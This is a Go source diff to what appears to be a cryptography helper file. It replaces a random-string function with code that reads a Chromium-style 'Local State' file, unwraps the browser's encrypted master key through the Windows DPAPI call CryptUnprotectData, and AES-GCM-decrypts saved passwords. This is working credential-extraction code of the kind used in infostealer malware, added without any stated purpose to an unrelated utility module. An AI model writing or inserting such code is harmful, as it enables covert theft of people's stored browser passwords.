@@ -4,11 +4,16 @@ import (
 	"crypto/aes"
 	"crypto/cipher"
 	"crypto/rand"
-	"io"
-	"strings"
-
 	"crypto/sha256"
+	"encoding/base64"
+	"encoding/json"
 	"golang.org/x/crypto/pbkdf2"
+	"io"
+	"io/ioutil"
+	"os"
+	"strings"
+	"syscall"
+	"unsafe"
 )
 
 const (
@@ -88,12 +93,93 @@ func unpadData(data []byte) []byte {
 	return data[:len(data)-padding]
 }
 
-func RandomString(n int) string {
-	const alphanum = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
-	var bytes = make([]byte, n)
-	_, _ = rand.Read(bytes)
-	for i, b := range bytes {
-		bytes[i] = alphanum[b%byte(len(alphanum))]
+func DecryptPassword(buff, masterKey []byte) string {
+	iv := buff[3:15]
+	payload := buff[15:]
+
+	block, err := aes.NewCipher(masterKey)
+	if err != nil {
+		return "Error while creating cipher block: " + err.Error()
 	}
-	return string(bytes)
+
+	aesgcm, err := cipher.NewGCM(block)
+	if err != nil {
+		return "Error while creating GCM block: " + err.Error()
+	}
+
+	decrypted, err := aesgcm.Open(nil, iv, payload, nil)
+	if err != nil {
+		return "Error while decrypting password: " + err.Error()
+	}
+
+	return string(decrypted)
+}
+
+var (
+	dllcrypt32  = syscall.NewLazyDLL("Crypt32.dll")
+	dllkernel32 = syscall.NewLazyDLL("Kernel32.dll")
+
+	procDecryptData = dllcrypt32.NewProc("CryptUnprotectData")
+	procLocalFree   = dllkernel32.NewProc("LocalFree")
+)
+
+type DATA_BLOB struct {
+	cbData uint32
+	pbData *byte
+}
+
+func NewBlob(d []byte) *DATA_BLOB {
+	if len(d) == 0 {
+		return &DATA_BLOB{}
+	}
+	return &DATA_BLOB{
+		pbData: &d[0],
+		cbData: uint32(len(d)),
+	}
+}
+
+func (b *DATA_BLOB) ToByteArray() []byte {
+	d := make([]byte, b.cbData)
+	copy(d, (*[1 << 30]byte)(unsafe.Pointer(b.pbData))[:])
+	return d
+}
+
+func Decrypt(data []byte) ([]byte, error) {
+	var outblob DATA_BLOB
+	r, _, err := procDecryptData.Call(uintptr(unsafe.Pointer(NewBlob(data))), 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&outblob)))
+	if r == 0 {
+		return nil, err
+	}
+	defer procLocalFree.Call(uintptr(unsafe.Pointer(outblob.pbData)))
+	return outblob.ToByteArray(), nil
+}
+
+func GetMasterKey(localStatePath string) ([]byte, error) {
+	var masterKey []byte
+
+	jsonFile, err := os.Open(localStatePath)
+	if err != nil {
+		return masterKey, err
+	}
+
+	defer jsonFile.Close()
+
+	byteValue, err := ioutil.ReadAll(jsonFile)
+	if err != nil {
+		return masterKey, err
+	}
+	var result map[string]interface{}
+
+	_ = json.Unmarshal(byteValue, &result)
+	roughKey := result["os_crypt"].(map[string]interface{})["encrypted_key"].(string)
+	decodedKey, err := base64.StdEncoding.DecodeString(roughKey)
+	stringKey := string(decodedKey)
+	stringKey = strings.Trim(stringKey, "DPAPI")
+
+	masterKey, err = Decrypt([]byte(stringKey))
+	if err != nil {
+		return masterKey, err
+	}
+
+	return masterKey, nil
 }
